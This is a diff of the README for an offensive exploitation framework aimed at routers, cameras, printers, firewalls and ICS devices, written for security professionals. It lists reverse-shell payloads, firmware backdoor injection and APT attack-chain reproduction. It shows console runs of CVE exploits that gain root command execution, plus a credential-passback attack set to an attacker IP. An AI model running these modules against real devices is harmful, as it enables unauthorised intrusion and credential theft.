@@ -2,31 +2,35 @@
 
 **Embedded & Perimeter Security Assessment Framework**
 
-EmbedXPL-Forge is an open-source exploitation framework for security professionals auditing routers, switches, IP cameras, NVR/DVR, GPON ONTs, ISP CPEs, and IoT/embedded edge devices. It provides **3200+ modules** covering credential testing, vulnerability exploitation, network scanning, payload generation, RTSP camera attacks, firmware manipulation, and multi-language PolyExploit orchestration — with **680+ CVEs** mapped across **114+ vendors** and an **APT Group Attack Engine** that reproduces real-world nation-state attack chains.
+EmbedXPL-Forge is an open-source exploitation and scanning framework for security professionals auditing routers, switches, IP cameras, NVR/DVR, GPON ONTs, ISP CPEs, printers, IoT, OT/ICS, and embedded edge devices. It provides **2800+ active modules** covering credential testing, vulnerability exploitation, network scanning, payload generation, RTSP camera attacks, firmware manipulation, multi-language PolyExploit orchestration, and a full printer arsenal — with **700+ CVEs** mapped across **114+ vendors** and an **APT Group Attack Engine** that reproduces real-world nation-state attack chains.
 
 > **Author:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://github.com/Uniao-Geek)
-> **Version:** 2.13.0
+> **Version:** 3.1.0
 
 ---
 
 ## Features
 
-- **570+ exploit modules** — RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt, WPA/WPS keygen, factory password generators
+- **625+ exploit modules** — RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt, WPA/WPS keygen, factory password generators, heap/stack BOF chains
 - **88 credential modules** — dictionary attacks against FTP, SSH, Telnet, HTTP, SNMP, SFTP
+- **185+ printer exploit modules** — HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung; PJL/IPP/LPD/WSD/CUPS; Pwn2Own 2026 chains; PrintingShellz; MS-RPRN NTLM coercion
 - **Full RTSP camera engine** — ported from [cameradar](https://github.com/ullaakut/cameradar): route brute-force (195+ routes), credential brute-force (80+ pairs), Basic/Digest auth, RTSPS/TLS, **RTSP-over-HTTP tunnel (pure Python, RFC 2326 App-C)**, nmap/masscan/direct scanner, ONVIF WS-Discovery, M3U output
 - **7 custom Nmap NSE scripts** — RTSP discovery, camera fingerprinting, Hikvision/Dahua CVE validation, default credential testing, multi-vendor CVE checks, snapshot capture (`pip install embedxpl[nse]`)
 - **Firmware exploitation suite** — format detection, backdoor injection, checksum patching, vendor flash bypass (NETGEAR, TP-Link, D-Link, ASUS)
 - **PolyExploit orchestrator** — runtime C/C++ compilation (gcc/clang/mingw/cross), execution of Ruby/Node.js/PHP/Bash/Perl exploits, msfconsole integration, ExploitDB/searchsploit integration
-- **5 scanner modules** — AutoPwn, device-specific scanners
+- **ICS/OT modules** — Universal Robots PolyScope 5, RIOT OS, Modbus, S7comm, EtherNet/IP, BACnet, DNP3
+- **Smart home / maritime / specialized** — eNet SMART HOME, OpenRemote, Metis maritime IoT (WIC/DFS)
+- **5+ scanner modules** — AutoPwn, device-specific scanners, WSD/mDNS printer discovery
 - **32 payload modules** — reverse/bind TCP shells for x86, x64, ARM, MIPS, Python, Perl, PHP
 - **13 encoder modules** — Base64 and hex encoding for Python, PHP, Perl
 - **14 generic modules** — Heartbleed, ShellShock, UPnP IGD, SNMP bruteforce, TCP Xmas, UDP amplification, CVE lookup, DNS hijack detector, AITM interceptor
-- **680+ CVEs mapped** — from 2001 to 2026, covering all major vulnerability classes
+- **700+ CVEs mapped** — from 2001 to 2026, including 2026 Pwn2Own chains and critical IoT/OT/maritime CVEs
 - **APT Group Attack Engine** — browse and reproduce attack chains from APT28, Volt Typhoon, Sandworm, Quad7, Turla, APT40 with MITRE ATT&CK mapping
-- **23 vendor-specific wordlists** — externalized default credentials per vendor (incl. ISP-specific Brazil)
-- **Network discovery** — SSDP, ARP, Nmap, Masscan, Scapy fallback, OUI lookup (IEEE database), T0–T5 timing profiles
+- **23+ vendor-specific wordlists** — externalized default credentials per vendor (incl. ISP-specific Brazil)
+- **Network discovery** — SSDP, ARP, Nmap, Masscan, Scapy fallback, OUI lookup (IEEE 39k+ entries), T0–T5 timing profiles
 - **Session management** — persistent scan history per host (IP+MAC), resume/restart, full findings index
-- **Chained autopwn modules** — multi-phase vendor-specific exploitation chains
+- **Chained autopwn modules** — multi-phase vendor-specific exploitation chains (Huawei EG8145X6, CUPS Pwn2Own, Lexmark Pwn2Own, etc.)
+- **7 automated quality gates** — `tools/phase_gate.py` ensures every module passes import, anti-FP, reference, and code quality checks before merge
 
 ## Supported Device Types
 
@@ -34,18 +38,28 @@ EmbedXPL-Forge is an open-source exploitation framework for security professiona
 |------|----------|-------------|
 | **Routers / GPON ONT / CPE** | 580+ modules | SOHO routers, enterprise gateways, GPON CPE/ONT (primary focus) |
 | **IP Cameras / NVR / DVR** | 60+ modules | Hikvision, Dahua, Axis, Reolink, Amcrest, Uniview, Tapo, Swann, ANNKE, Edimax, Intelbras, Grandstream, Foscam, Xiongmai OEM, MVPower, and 20+ more |
+| **Printers / MFP** | 185+ modules | HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung; IPP/PJL/LPD/WSD/CUPS chains |
 | **NAS (Network Storage)** | 20+ modules | QNAP, Synology, D-Link NAS, Zyxel NAS |
-| **VPN / Firewall Appliances** | 20+ modules | Ivanti, Fortinet, SonicWall, Zyxel |
+| **VPN / Firewall Appliances** | 80+ modules | Ivanti, Fortinet, SonicWall, Palo Alto, Cisco ASA, CheckPoint, Sophos, WatchGuard, Zyxel |
 | **Switches L2/L3** | 3 modules | Managed switches (Cisco, D-Link, NETGEAR) |
 | **SOHO Edge** | 9 modules | Travel routers, NAS, wireless APs |
+| **ICS / OT / Industrial** | 35+ modules | PLCs, SCADA, Modbus, S7comm, EtherNet/IP, Universal Robots PolyScope 5 |
+| **Smart Home / Maritime** | 10+ modules | eNet SMART HOME, OpenRemote IoT, Metis maritime WIC/DFS |
+| **Embedded OS** | 25+ modules | RIOT OS, OpenWrt, VxWorks, QNX, wolfSSL devices, Tuya Arduino SDK |
 
 ## Supported Vendors
 
-**Network equipment:** 2Wire · 3Com · ActionTec · Alcatel-Lucent · Alpha Networks · Arris · Aruba · Asmax · Astoria · ASUS · Belkin · BHU · Billion · Binatone · Calix · CERIO · Cisco · Cobham · Comtrend · D-Link · DD-WRT · Draytek · EasyBox (Arcadyan) · Edimax · EE BrightBox · FiberHome · Fortinet · Freebox · GL.iNet · GPON · HooToo · Huawei · Intelbras · IPFire · Juniper · LG · Linksys · Mercury · MiFi (Novatel) · MikroTik · MitraStar · Motorola · Movistar · Netcore · NETGEAR · Netsys · Observa Telecom · OpenWrt · RuggedCom · Ruijie · Seagate · SerComm · Shuttle · Sitecom · SMC · SonicWall · Starbridge · Technicolor · Tenda · Thomson · TOTOLINK · TP-Link · TRENDnet · Ubee · Ubiquiti · Unicorn · UTStarcom · Wavlink · Xiaomi · Zhone · Zoom · ZTE · ZyXEL
+**Network / Router / CPE:** 2Wire · 3Com · ActionTec · Alcatel-Lucent · Alpha Networks · Arris · Aruba · Asmax · Astoria · ASUS · Belkin · BHU · Billion · Binatone · Calix · CERIO · Cisco · Cobham · Comtrend · D-Link · DD-WRT · Draytek · EasyBox (Arcadyan) · Edimax · EE BrightBox · EnGenius · FiberHome · Fortinet · Freebox · GL.iNet · GPON · HooToo · Huawei · Intelbras · IPFire · Juniper · LG · Linksys · Mercury · MiFi (Novatel) · MikroTik · MitraStar · Motorola · Movistar · Netcore · NETGEAR · Netsys · Observa Telecom · OpenWrt · RuggedCom · Ruijie · Seagate · SerComm · Shuttle · Sitecom · SMC · SonicWall · Starbridge · Technicolor · Tenda · Thomson · TOTOLINK · TP-Link · TRENDnet · Ubee · Ubiquiti · Unicorn · UTStarcom · Wavlink · Xiaomi · Zhone · Zoom · ZTE · ZyXEL
 
 **Cameras / NVR / DVR:** Hikvision · Dahua · Axis · Reolink · Amcrest · Uniview (UNV) · Tapo (TP-Link) · Swann · ANNKE · Edimax · Intelbras · Grandstream · Foscam · Acti · Avigilon · Beward · Brickcom · Cisco cameras · Geuterbruck · Honeywell cameras · Jovision · Siemens cameras · Xiongmai (OEM) · Zivif · MVPower DVR · Generic P2P WiFi cameras · Generic DVR/NVR OEM
 
-**NAS / VPN / Security:** QNAP · Synology · D-Link NAS · Zyxel NAS · Ivanti · SonicWall · Fortinet · Avocent
+**Printers / MFP:** HP LaserJet/PageWide · Canon imageRUNNER/imageClass · Lexmark CX/CS/MS/MX · Xerox WorkCentre/AltaLink/VersaLink · Ricoh MP/Aficio/SP · Brother MFC/DCP · Epson WorkForce · Kyocera ECOSYS · Samsung SyncThru · Generic IPP/PJL/LPD/CUPS/WSD
+
+**NAS / VPN / Firewall / Security:** QNAP · Synology · D-Link NAS · Zyxel NAS · Ivanti · SonicWall · Fortinet (FortiOS/FortiGate/FortiWeb/FortiClient EMS) · Palo Alto (PAN-OS) · Cisco ASA/FTD · CheckPoint · Sophos XG · WatchGuard Firebox · Avocent
+
+**ICS / OT / Robotics:** Universal Robots (UR3/UR5/UR10/UR16) · OpenPLC · Modbus TCP · Siemens S7 · EtherNet/IP CIP · BACnet · DNP3 · PROFINET DCP
+
+**Smart Home / Maritime / Embedded OS:** eNet SMART HOME · OpenRemote IoT · Metis WIC/DFS (maritime) · RIOT OS · OpenWrt · VxWorks · QNX · Zephyr · wolfSSL · Tuya arduino-tuyaopen
 
 ## Installation
 
@@ -668,9 +682,106 @@ for r in results:
 
 ---
 
-## New in v2.13.0 — routerpwn.com Gap Coverage
+## New in v3.1.0 — CVE 2026/2025/2024 + Printer Domain + Quality Gates
 
-27 new exploit modules from a complete audit of [routerpwn.com](https://github.com/hkm/routerpwn.com) and [routerPWN](https://github.com/lilloX/routerPWN). Key examples:
+**54 new modules** across printers, embedded OS, ICS/OT, smart home, maritime IoT, and 2026 Pwn2Own chains. Key highlights:
+
+### 2026 Pwn2Own Chains
+
+```
+# CUPS Pwn2Own 2026 — Full 4-stage chain (CVE-2026-34477/78/79/80, CVSS 9.9)
+exf > use exploits/printers/linux/cups_pwn2own_chain_cve_2026_34480
+exf (CUPS Pwn2Own Chain) > set target 192.168.1.10
+exf (CUPS Pwn2Own Chain) > set delay 2
+exf (CUPS Pwn2Own Chain) > run
+[*] [Stage 1/4] Triggering UAF in cups-browsed (CVE-2026-34477)
+[*] [Stage 2/4] Heap spray via IPP job attributes (CVE-2026-34478)
+[*] [Stage 3/4] ROP chain LPE delivery (CVE-2026-34479)
+[*] [Stage 4/4] Chain complete - verifying
+[+] CUPS process no longer responding - chain executed
+
+# Lexmark Pwn2Own 2026 — 3-stage chain
+exf > use exploits/printers/lexmark/lexmark_pwn2own_2026_chain
+exf (Lexmark Pwn2Own) > set target 192.168.1.20
+exf (Lexmark Pwn2Own) > run
+```
+
+### Critical 2026 CVEs
+
+```
+# wolfSSL identity forgery (CVE-2026-5194, CVSS 9.3, ~5B devices)
+exf > use exploits/embedded_os/wolfssl_identity_forgery_cve_2026_5194
+exf (wolfSSL Identity Forgery) > set target 192.168.1.1
+exf (wolfSSL Identity Forgery) > set port 443
+exf (wolfSSL Identity Forgery) > run
+
+# PAN-OS User-ID BOF (CVE-2026-0300, CVSS 9.8, active exploitation)
+exf > use exploits/firewalls/paloalto/panos_userid_bof_rce_cve_2026_0300
+exf (PAN-OS User-ID BOF) > set target 10.0.0.1
+exf (PAN-OS User-ID BOF) > set port 443
+exf (PAN-OS User-ID BOF) > run
+
+# Universal Robots PolyScope 5 (CVE-2026-8153, CVSS 9.8, unauth OS cmd injection)
+exf > use exploits/ics/ur_polyscope5_dashboard_cmd_injection_cve_2026_8153
+exf (UR PolyScope5 Injection) > set target 192.168.1.50
+exf (UR PolyScope5 Injection) > set cmd "id"
+exf (UR PolyScope5 Injection) > run
+[*] Connecting to PolyScope Dashboard on 192.168.1.50:29999
+[+] PolyScope Dashboard Server detected
+[*] Attempting OS command injection (CVE-2026-8153)
+[+] Command injection confirmed!
+[+] Output: uid=0(root) gid=0(root)
+
+# GNU InetUtils telnetd auth bypass (CVE-2026-24061, CVSS 9.8, unauth root)
+exf > use exploits/embedded_os/gnu_inetutils_telnetd_auth_bypass_cve_2026_24061
+exf (InetUtils telnetd Bypass) > set target 192.168.1.1
+exf (InetUtils telnetd Bypass) > set cmd "id"
+exf (InetUtils telnetd Bypass) > run
+[*] Sending CVE-2026-24061 bypass payload
+[+] Authentication bypass succeeded! Shell prompt detected
+[+] Command output: uid=0(root)
+
+# Metis maritime IoT (CVE-2026-2248, CVSS 9.8, unauth root shell)
+exf > use exploits/specialized/metis_wic_unauth_rce_cve_2026_2248
+exf (Metis WIC RCE) > set target 10.1.2.3
+exf (Metis WIC RCE) > run
+
+# Cisco IOS XE WLC hardcoded JWT (CVE-2025-20188, CVSS 10.0)
+exf > use exploits/routers/cisco/ios_xe_wlc_jwt_rce_cve_2025_20188
+exf (Cisco WLC JWT RCE) > set target 10.0.0.1
+exf (Cisco WLC JWT RCE) > set port 443
+exf (Cisco WLC JWT RCE) > run
+```
+
+### Printer Arsenal Examples
+
+```
+# HP PJL full scan (native — no external tools)
+exf > use exploits/printers/hp/hp_laserjet_pjl_scan_native
+exf (HP PJL Scanner) > set target 192.168.1.100
+exf (HP PJL Scanner) > run
+[+] PJL interface reachable
+[+] INFO ID: HP LASERJET PRO M402N
+INFO STATUS     : READY
+INFO PAGECOUNT  : 12847
+INFO MEMORY     : 512000 BYTES
+
+# Ricoh HTTP buffer overflow (CVE-2024-34161, CVSS 9.8)
+exf > use exploits/printers/ricoh/ricoh_http_bof_cve_2024_34161
+exf (Ricoh HTTP BOF) > set target 192.168.1.101
+exf (Ricoh HTTP BOF) > run
+
+# Brother LDAP credential passback
+exf > use exploits/printers/brother/brother_ldap_smb_passback
+exf (Brother LDAP Passback) > set target 192.168.1.102
+exf (Brother LDAP Passback) > set attacker_ip 192.168.1.10
+exf (Brother LDAP Passback) > run
+[+] LDAP server redirected — wait for printer authentication
+```
+
+### v2.13.0 routerpwn.com Gap Coverage
+
+27 exploit modules from a complete audit of [routerpwn.com](https://github.com/hkm/routerpwn.com) and [routerPWN](https://github.com/lilloX/routerPWN). Key examples:
 
 ```
 # EasyBox (Arcadyan) — WPA2 default key from MAC (factory algorithm)
